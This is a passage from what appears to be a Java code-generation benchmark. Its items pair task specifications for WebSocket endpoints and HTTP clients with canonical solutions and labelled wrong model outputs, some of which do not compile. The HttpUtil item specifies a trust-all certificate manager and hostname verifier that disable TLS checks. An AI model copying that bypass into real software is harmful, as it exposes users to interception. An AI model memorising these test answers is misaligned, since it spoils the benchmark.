AopProxyUtils.ultimateTargetClass(handler);\n        Type[] interfaces = targetClass.getGenericInterfaces();\n        Class<?> superclass = targetClass.getSuperclass();\n        while ((Objects.isNull(interfaces) || interfaces.length == 0) && Objects.nonNull(superclass)) {\n            interfaces = superclass.getGenericInterfaces();\n            superclass = targetClass.getSuperclass();\n        }\n        if (Objects.nonNull(interfaces)) {\n            for (Type type : interfaces) {\n                if (type instanceof ParameterizedType) {\n                    ParameterizedType parameterizedType = (ParameterizedType) type;\n                    if (Objects.equals(parameterizedType.getRawType(), MessageHandler.class)) {\n                        Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n                        if (Objects.nonNull(actualTypeArguments) && actualTypeArguments.length > 0) {\n                            return (Class<Message>) actualTypeArguments[0];\n                        }\n                    }\n                }\n            }\n        }\n        throw new IllegalStateException(String.format(\"Cannot determine message type for handler %s\", handler));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "```java\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.EndpointConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class WebsocketServerEndpoint {\n    private static final Logger logger = LoggerFactory.getLogger(WebsocketServerEndpoint.class);\n    private static final Map<String, MessageHandler> HANDLERS = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        String accessToken = session.getQueryString();\n        if (accessToken == null || !isValidAccessToken(accessToken)) {\n            logger.warn(\"Invalid access token: {}\", accessToken);\n            session.close();\n            return;\n        }\n        logger.info(\"Client connected: {}\", session.getId());\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        try {\n            String messageType = determineMessageType(message);\n            MessageHandler handler = HANDLERS.get(messageType);\n            if (handler != null) {\n                handler.handle(session, message);\n            } else {\n                logger.warn(\"No handler found for message type: {}\", messageType);\n            }\n        } catch (Exception e) {\n            logger.error(\"Error processing message\", e);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"Client disconnected: {} - {}\", session.getId(), closeReason.getReasonPhrase());\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"WebSocket error for client: {}\", session.getId(), throwable);\n    }\n\n    private boolean isValidAccessToken(String accessToken) {\n        return \"valid_token\".equals(accessToken);\n    }\n\n    private String determineMessageType(String message) {\n        return \"default\"; // Placeholder logic; can be extended based on message structure\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Type genericInterface = handler.getClass().getGenericInterfaces()[0];\n        if (genericInterface instanceof ParameterizedType) {\n            ParameterizedType parameterizedType = (ParameterizedType) genericInterface;\n            Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n            if (actualTypeArguments.length > 0 && actualTypeArguments[0] instanceof Class) {\n                return (Class<? extends Message>) actualTypeArguments[0];\n            }\n        }\n        return Message.class;\n    }\n}\n```"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for secure shell terminal communication, handling client connections, message exchange, and session management.\n\nClass Description: SecureShellWS is a Java EE WebSocket endpoint that facilitates secure shell terminal interactions between clients and servers. It manages terminal sessions, processes keyboard input commands, and handles connection lifecycle events.\n\nAttributes:\n- log: [Logger] - Logger instance for error and debug logging\n- keyMap: [Map<Integer, byte[]>] - Static mapping of key codes to their corresponding byte sequences for terminal control\n- httpSession: [HttpSession] - HTTP session associated with the WebSocket connection\n- session: [Session] - WebSocket session object for the current connection\n- sessionId: [Long] - Unique identifier for the terminal session\n\nMethods:\n- onOpen: [onOpen](Session session, EndpointConfig config) -> void - Handles new WebSocket connections, initializes session parameters, and starts output thread\n- onMessage: [onMessage](String message) -> void - Processes incoming JSON messages containing terminal commands or key inputs\n- onError: [onError](Session session, Throwable t) -> void - Handles WebSocket communication errors\n- onClose: [onClose]() -> void - Cleans up resources when WebSocket connection is closed, terminating all associated terminal sessions",
    "Canonical_solution": "import com.google.gson.Gson;\nimport io.bastillion.common.util.AppConfig;\nimport io.bastillion.common.util.AuthUtil;\nimport io.bastillion.manage.control.SecureShellKtrl;\nimport io.bastillion.manage.db.UserDB;\nimport io.bastillion.manage.model.SchSession;\nimport io.bastillion.manage.model.UserSchSessions;\nimport io.bastillion.manage.task.SentOutputTask;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.http.HttpSession;\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@ServerEndpoint(value = \"/admin/terms.ws\", configurator = GetHttpSessionConfigurator.class)\npublic class SecureShellWS {\n\n    private static final Logger log = LoggerFactory.getLogger(SecureShellWS.class);\n    private static final Map<Integer, byte[]> keyMap = new HashMap<>();\n\n    static {\n        keyMap.put(27, new byte[]{(byte) 0x1b});\n        keyMap.put(13, new byte[]{(byte) 0x0d});\n        keyMap.put(37, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x44});\n        keyMap.put(38, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x41});\n        keyMap.put(39, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x43});\n        keyMap.put(40, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x42});\n        keyMap.put(8, new byte[]{(byte) 0x7f});\n        keyMap.put(9, new byte[]{(byte) 0x09});\n        keyMap.put(17, new byte[]{});\n        keyMap.put(46, \"\\033[3~\".getBytes());\n        keyMap.put(45, \"\\033[2~\".getBytes());\n        keyMap.put(33, \"\\033[5~\".getBytes());\n        keyMap.put(34, \"\\033[6~\".getBytes());\n        keyMap.put(35, \"\\033[4~\".getBytes());\n        keyMap.put(36, \"\\033[1~\".getBytes());\n    }\n\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        if (StringUtils.isNotEmpty(AppConfig.getProperty(\"websocketTimeout\"))) {\n            session.setMaxIdleTimeout(Long.parseLong(AppConfig.getProperty(\"websocketTimeout\")) * 60000);\n        } else {\n            session.setMaxIdleTimeout(0);\n        }\n\n        this.httpSession = (HttpSession) config.getUserProperties().get(HttpSession.class.getName());\n        try {\n            this.sessionId = AuthUtil.getSessionId(httpSession);\n            this.session = session;\n            new Thread(new SentOutputTask(sessionId, session, UserDB.getUser(AuthUtil.getUserId(httpSession)))).start();\n        } catch (GeneralSecurityException | SQLException ex) {\n            log.error(ex.toString(), ex);\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        if (session.isOpen() && StringUtils.isNotEmpty(message) && !\"heartbeat\".equals(message)) {\n            try {\n                Map jsonRoot = new Gson().fromJson(message, Map.class);\n                String command = (String) jsonRoot.get(\"command\");\n                Integer keyCode = null;\n                Double keyCodeDbl = (Double) jsonRoot.get(\"keyCode\");\n                if (keyCodeDbl != null) {\n                    keyCode = keyCodeDbl.intValue();\n                }\n\n                for (String idStr : (ArrayList<String>) jsonRoot.get(\"id\")) {\n                    Integer id = Integer.parseInt(idStr);\n                    UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n                    if (userSchSessions != null) {\n                        SchSession schSession = userSchSessions.getSchSessionMap().get(id);\n                        if (keyCode != null && keyMap.containsKey(keyCode)) {\n                            schSession.getCommander().write(keyMap.get(keyCode));\n                        } else {\n                            schSession.getCommander().print(command);\n                        }\n                    }\n                }\n                AuthUtil.setTimeout(httpSession);\n            } catch (IOException ex) {\n                log.error(ex.toString(), ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.error(t.toString(), t);\n    }\n\n    @OnClose\n    public void onClose() {\n        UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n        if (userSchSessions != null) {\n            Map<Integer, SchSession> schSessionMap = userSchSessions.getSchSessionMap();\n            for (Integer sessionKey : schSessionMap.keySet()) {\n                SchSession schSession = schSessionMap.get(sessionKey);\n                schSession.getChannel().disconnect();\n                schSession.getSession().disconnect();\n                schSessionMap.remove(sessionKey);\n            }\n            schSessionMap.clear();\n            SecureShellKtrl.getUserSchSessionMap().remove(sessionId);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "{\"class\":\"SecureShellWS\",\"attributes\":[{\"name\":\"log\",\"type\":\"Logger\"},{\"name\":\"keyMap\",\"type\":\"Map<Integer, byte[]>\"},{\"name\":\"httpSession\",\"type\":\"HttpSession\"},{\"name\":\"session\",\"type\":\"Session\"},{\"name\":\"sessionId\",\"type\":\"Long\"}],\"methods\":[{\"name\":\"onOpen\",\"parameters\":[{\"name\":\"session\",\"type\":\"Session\"},{\"name\":\"config\",\"type\":\"EndpointConfig\"}],\"returnType\":\"void\",\"body\":\"this.session = session;\\nthis.httpSession = ((ServerEndpointConfig)config).getUserProperties().get(\\\"httpSession\\\");\\nthis.sessionId = System.currentTimeMillis();\\nlog.info(\\\"New WebSocket connection established. Session ID: \\\" + sessionId);\\nstartOutputThread();\"},{\"name\":\"onMessage\",\"parameters\":[{\"name\":\"message\",\"type\":\"String\"}],\"returnType\":\"void\",\"body\":\"try {\\n    JsonObject json = new Gson().fromJson(message, JsonObject.class);\\n    if (json.has(\\\"command\\\")) {\\n        handleCommand(json.get(\\\"command\\\").getAsString());\\n    } else if (json.has(\\\"key\\\")) {\\n        handleKeyInput(json.get(\\\"key\\\").getAsInt());\\n    }\\n} catch (Exception e) {\\n    log.error(\\\"Error processing message: \\\" + message, e);\\n};\"},{\"name\":\"onError\",\"parameters\":[{\"name\":\"session\",\"type\":\"Session\"},{\"name\":\"t\",\"type\":\"Throwable\"}],\"returnType\":\"void\",\"body\":\"log.error(\\\"WebSocket error in session \\\" + sessionId, t);\\ncloseConnection();\"},{\"name\":\"onClose\",\"parameters\":[],\"returnType\":\"void\",\"body\":\"log.info(\\\"WebSocket connection closed. Session ID: \\\" + sessionId);\\ncloseConnection();\"},{\"name\":\"handleCommand\",\"parameters\":[{\"name\":\"command\",\"type\":\"String\"}],\"returnType\":\"void\",\"body\":\"// Implementation for handling terminal commands\"},{\"name\":\"handleKeyInput\",\"parameters\":[{\"name\":\"keyCode\",\"type\":\"int\"}],\"returnType\":\"void\",\"body\":\"byte[] keyBytes = keyMap.get(keyCode);\\nif (keyBytes != null) {\\n    sendOutput(keyBytes);\\n} else {\\n    log.warn(\\\"Unsupported key code: \\\" + keyCode);\\n}\"},{\"name\":\"startOutputThread\",\"parameters\":[],\"returnType\":\"void\",\"body\":\"new Thread(() -> {\\n    while (true) {\\n        try {\\n            Thread.sleep(100);\\n            // Simulate output to client\\n            sendOutput(\\\"\\\\r\\\\n$ \\\".getBytes());\\n        } catch (InterruptedException e) {\\n            log.error(\\\"Output thread interrupted\\\", e);\\n            break;\\n        }\\n    }\\n}).start();\"},{\"name\":\"sendOutput\",\"parameters\":[{\"name\":\"data\",\"type\":\"byte[]\"}],\"returnType\":\"void\",\"body\":\"try {\\n    if (session != null && session.isOpen()) {\\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(data));\\n    }\\n} catch (IOException e) {\\n    log.error(\\\"Failed to send output\\\", e);\\n};\"},{\"name\":\"closeConnection\",\"parameters\":[],\"returnType\":\"void\",\"body\":\"try {\\n    if (session != null && session.isOpen()) {\\n        session.close();\\n    }\\n} catch (IOException e) {\\n    log.error(\\\"Failed to close session\\\", e);\\n};\"},{\"name\":\"keyMap\",\"static\":true,\"type\":\"Map<Integer, byte[]>\",\"body\":\"keyMap = new HashMap<>();\\nkeyMap.put(13, \\\"\\\\r\\\".getBytes());\\nkeyMap.put(8, \\\"\\\\b\\\".getBytes());\\nkeyMap.put(27, \\\"\\\\x1B\\\".getBytes());\"}]"
  },
  {
    "Task_id": 49,
    "Instruction": "Task Description: Create a Java HTTP client class that simplifies making HTTP requests (GET, POST, DELETE) to a base URI, with support for parameterized URLs and exception handling.\n\nClass Description: TeenyHttpClient is a lightweight HTTP client wrapper that provides methods for common HTTP operations. It handles request construction, execution, and basic response handling while abstracting away boilerplate code.\n\nAttributes:\nbaseUri: String - The base URL to which all requests will be appended\nhttpClient: HttpClient - The underlying HttpClient instance used for making requests\n\nMethods:\nget: get(String url) -> HttpResponse<String> - Sends a GET request to the specified URL appended to the base URI\nget: get(String url, Object... params) -> HttpResponse<String> - Sends a GET request with URL parameters (formatted using String.format)\ndelete: delete(String url, Object... params) -> HttpResponse<String> - Sends a DELETE request with URL parameters\npost: post(String url, Object... params) -> HttpResponse<String> - Sends a POST request with URL parameters (with empty body)\nunchecked: unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) -> T - Helper method that wraps checked exceptions in RuntimeException",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\n\npublic class TeenyHttpClient {\n\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        httpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_1_1)\n                .build();\n    }\n\n    public HttpResponse<String> get(String url) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + url))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .DELETE()\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    private <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.Objects;\n\npublic class TeenyHttpClient {\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = Objects.requireNonNull(baseUri);\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public HttpResponse<String> get(String url) throws Exception {\n        return sendRequest(HttpRequest.Method.GET, url, null);\n    }\n\n    public HttpResponse<String> get(String url, Object... params) throws Exception {\n        String formattedUrl = String.format(url, params);\n        return sendRequest(HttpRequest.Method.GET, formattedUrl, null);\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) throws Exception {\n        String formattedUrl = String.format(url, params);\n        return sendRequest(HttpRequest.Method.DELETE, formattedUrl, null);\n    }\n\n    public HttpResponse<String> post(String url, Object... params) throws Exception {\n        String formattedUrl = String.format(url, params);\n        return sendRequest(HttpRequest.Method.POST, formattedUrl, null);\n    }\n\n    private HttpResponse<String> sendRequest(String method, String path, String body) throws Exception {\n        String fullUrl = baseUri + path;\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .method(method, HttpRequest.BodyPublishers.ofString(body == null ? \"\" : body))\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public static <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @FunctionalInterface\n    public interface ThrowingSupplier<T> {\n        T get() throws Exception;\n    }\n}\n```"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java for deploying containers, handling client connections, and managing deployment processes with error handling.\n\nClass Description: The ContainerDeployServerEndpoint class is a WebSocket server endpoint that facilitates container deployment through WebSocket connections. It handles client connections, initiates container deployment, and manages errors during the process. The class uses Java EE WebSocket API and integrates with a ContainerService for deployment operations.\n\nAttributes:\n- containerService: [ContainerService] - Service responsible for container deployment operations (injected via Spring)\n- log: [Logger] - SLF4J logger instance for logging events and errors (provided by Lombok)\n\nMethods:\n- onOpen: [onOpen](Long id, Session session) -> void - Handles new WebSocket connections. Takes container ID and session as parameters. Sends connection confirmation, initiates deployment, and closes the session. Logs errors if deployment fails.\n- onError: [onError](Session session, Throwable throwable) -> void - Handles WebSocket errors. Takes the session and throwable as parameters. Closes the session and logs the error.\n  \nNote: The class uses @ServerEndpoint annotation to define the WebSocket endpoint path with a configurator, and includes @Component for Spring integration. The endpoint path includes a path parameter for container ID (/container/deploy/{id}).",
    "Canonical_solution": "import tech.powerjob.server.config.OmsEndpointConfigure;\nimport tech.powerjob.server.core.container.ContainerService;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.lang3.exception.ExceptionUtils;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.Resource;\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\n@Slf4j\n@Component\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = OmsEndpointConfigure.class)\npublic class ContainerDeployServerEndpoint {\n\n    @Resource\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        RemoteEndpoint.Async remote = session.getAsyncRemote();\n        remote.sendText(\"SYSTEM: connected successfully, start to deploy container: \" + id);\n        try {\n            containerService.deploy(id, session);\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] deploy container {} failed.\", id, e);\n            remote.sendText(\"SYSTEM: deploy failed because of the exception\");\n            remote.sendText(ExceptionUtils.getStackTrace(e));\n        }\n        try {\n            session.close();\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session for {} failed.\", id, e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session failed.\", e);\n        }\n        log.warn(\"[ContainerDeployServerEndpoint] session onError!\", throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = ContainerDeployConfigurator.class)\n@Component\npublic class ContainerDeployServerEndpoint {\n    @Autowired\n    private ContainerService containerService;\n    private static final Logger log = LoggerFactory.getLogger(ContainerDeployServerEndpoint.class);\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        try {\n            log.info(\"WebSocket connection opened for container ID: {}\", id);\n            session.getBasicRemote().sendText(\"Connection established. Deploying container...\");\n            containerService.deployContainer(id);\n            session.close();\n        } catch (Exception e) {\n            log.error(\"Error during deployment for container ID: {}\", id, e);\n            try {\n                session.getBasicRemote().sendText(\"Deployment failed: \" + e.getMessage());\n                session.close();\n            } catch (IOException ioException) {\n                log.error(\"Failed to send error message or close session\", ioException);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        log.error(\"WebSocket error occurred\", throwable);\n        try {\n            session.close();\n        } catch (IOException ioException) {\n            log.error(\"Failed to close session after error\", ioException);\n        }\n    }\n}"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that echoes received text messages back to the client asynchronously.\n\nClass Description: This class represents a WebSocket server endpoint that handles text-based communication with clients. It listens for incoming text messages and echoes them back to the sender using asynchronous communication.\n\nAttributes: None\n\nMethods:\n- echoText: [String text, Session session] -> void - Handles incoming text messages from clients. Takes the received text and the client session as input, then sends the same text back to the client asynchronously using the session's async remote endpoint.",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/text\")\npublic class MyAsyncEndpointText {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "```java\nimport jakarta.websocket.OnMessage;\nimport jakarta.websocket.Session;\nimport jakarta.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/echo\")\npublic class EchoEndpoint {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}\n```"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Create a Java utility class for making HTTP/HTTPS requests with support for custom timeouts, request methods, content types, and handling of both successful and error responses.\n\nClass Description: HttpUtil is a utility class that provides methods for making HTTP/HTTPS requests. It handles both secure (HTTPS) and non-secure (HTTP) connections, supports various request methods (GET, POST, etc.), and includes proper error handling and resource cleanup.\n\nAttributes:\n- Timeout: [int] - Default timeout value for connections (5000ms)\n- DefalutEncoding: [String] - Default character encoding for requests/responses (\"UTF-8\")\n- currentProxy: [Map] - Storage for proxy configuration (currently unused in the reference implementation)\n- allHostsValid: [HostnameVerifier] - Custom hostname verifier that accepts all HTTPS hosts\n\nMethods:\n- httpRequest: [httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding)] -> [String] - Makes an HTTP/HTTPS request with specified parameters and returns the response as a string\n- readString: [readString(InputStream inputStream, String encoding)] -> [String] - Helper method to read an InputStream into a String with specified encoding\n- X509TrustUtiil: [Nested class implementing X509TrustManager] - Custom trust manager that accepts all certificates for HTTPS connections\n\nThe class handles:\n1. Both HTTP and HTTPS connections\n2. Custom timeouts for connect and read operations\n3. Various request methods (GET, POST, etc.)\n4. Request headers (particularly Content-Type)\n5. Request body for POST requests\n6. Proper error stream handling\n7. Resource cleanup (connection closing, stream closing)\n8. SSL certificate verification bypass for HTTPS\n9. Character encoding for requests and responses",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.HashMap;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpUtil {\n    private static final int Timeout = 5000;\n    private static final String DefalutEncoding = \"UTF-8\";\n    private static Map currentProxy = new HashMap();\n    public static HostnameVerifier allHostsValid = new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) throws Exception {\n        if (\"\".equals(encoding) || encoding == null) {\n            encoding = DefalutEncoding;\n        }\n\n        URLConnection httpUrlConn = null;\n        HttpsURLConnection hsc = null;\n        HttpURLConnection hc = null;\n        InputStream inputStream = null;\n\n        String result;\n        try {\n            URL url = new URL(requestUrl);\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n                TrustManager[] tm = new TrustManager[]{new X509TrustUtiil()};\n                sslContext.init(null, tm, new SecureRandom());\n                SSLSocketFactory ssf = sslContext.getSocketFactory();\n                hsc = (HttpsURLConnection) url.openConnection();\n                hsc.setSSLSocketFactory(ssf);\n                hsc.setHostnameVerifier(allHostsValid);\n                httpUrlConn = hsc;\n            } else {\n                hc = (HttpURLConnection) url.openConnection();\n                hc.setRequestMethod(requestMethod);\n                hc.setInstanceFollowRedirects(false);\n                httpUrlConn = hc;\n            }\n\n            httpUrlConn.setConnectTimeout(timeOut);\n            httpUrlConn.setReadTimeout(timeOut);\n            if (contentType != null && !\"\".equals(contentType)) {\n                httpUrlConn.setRequestProperty(\"Content-Type\", contentType);\n            }\n\n            httpUrlConn.setDoOutput(true);\n            httpUrlConn.setDoInput(true);\n            httpUrlConn.connect();\n            if (null != postString && !\"\".equals(postString)) {\n                OutputStream outputStream = httpUrlConn.getOutputStream();\n                outputStream.write(postString.getBytes(encoding));\n                outputStream.flush();\n                outputStream.close();\n            }\n\n            inputStream = httpUrlConn.getInputStream();\n            result = readString(inputStream, encoding);\n            return result;\n        } catch (IOException var18) {\n            if (hsc == null) {\n                if (hc != null) {\n                    result = readString(hc.getErrorStream(), encoding);\n                    return result;\n                }\n                result = \"\";\n                return result;\n            }\n            result = readString(hsc.getErrorStream(), encoding);\n        } finally {\n            if (hsc != null) {\n                hsc.disconnect();\n            }\n            if (hc != null) {\n                hc.disconnect();\n            }\n        }\n        return result;\n    }\n\n    public static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedInputStream bis = null;\n        ByteArrayOutputStream baos = null;\n\n        try {\n            bis = new BufferedInputStream(inputStream);\n            baos = new ByteArrayOutputStream();\n            byte[] arr = new byte[1];\n\n            int len;\n            while ((len = bis.read(arr)) != -1) {\n                baos.write(arr, 0, len);\n            }\n        } finally {\n            if (baos != null) {\n                baos.flush();\n                baos.close();\n            }\n            if (bis != null) {\n                bis.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            return baos.toString(encoding);\n        }\n    }\n\n    static class X509TrustUtiil implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUtil {\n    private static final int TIMEOUT = 5000;\n    private static final String DEFAULT_ENCODING = \"UTF-8\";\n    private static Map<String, String> currentProxy;\n    private static HostnameVerifier allHostsValid = (hostname, session) -> true;\n\n    public static String httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding) {\n        if (encoding == null || encoding.isEmpty()) {\n            encoding = DEFAULT_ENCODING;\n        }\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            if (requestUrl.startsWith(\"https\")) {\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(null, new TrustManager[]{new X509TrustUtil()}, new SecureRandom());\n                SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n                ((HttpsURLConnection) connection).setSSLSocketFactory(sslSocketFactory);\n                ((HttpsURLConnection) connection).setHostnameVerifier(allHostsValid);\n            }\n            connection.setRequestMethod(requestMethod);\n            connection.setConnectTimeout(timeOut);\n            connection.setReadTimeout(timeOut);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", contentType);\n            if (postString != null && !postString.isEmpty()) {\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = postString.getBytes(encoding);\n                    os.write(input, 0, input.length);\n                }\n            }\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                return readString(connection.getInputStream(), encoding);\n            } else {\n                return readString(connection.getErrorStream(), encoding);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private static String readString(InputStream inputStream, String encoding) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, encoding));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        return response.toString();\n    }\n\n    private static class X509TrustUtil implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n}"
  },
  {
    "Task_id": 502,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a PD (Placement Driver) server, supporting both blocking and asynchronous communication patterns, with connection management and error handling capabilities.\n\nClass Description: AbstractClient is an abstract base class that provides core gRPC client functionality for PD server communication. It manages channel connections, creates stubs, implements retry logic, and handles connection failures. The class is designed to be extended by concrete implementations that provide specific stub creation methods.\n\nAttributes:\n- chs: ConcurrentHashMap<String, ManagedChannel> - Shared map of managed channels by host\n- stubProxy: AbstractClientStubProxy - Proxy for managing stub instances\n- config: PDConfig - Configuration object containing server hosts and timeout settings\n- channel: ManagedChannel - Current active channel connection\n- stubs: ConcurrentMap<String, AbstractBlockingStub> - Map of blocking stubs by address\n\nMethods:\n- AbstractClient(PDConfig config) -> void - Constructor that initializes the client with configuration\n- getBlockingStub() -> 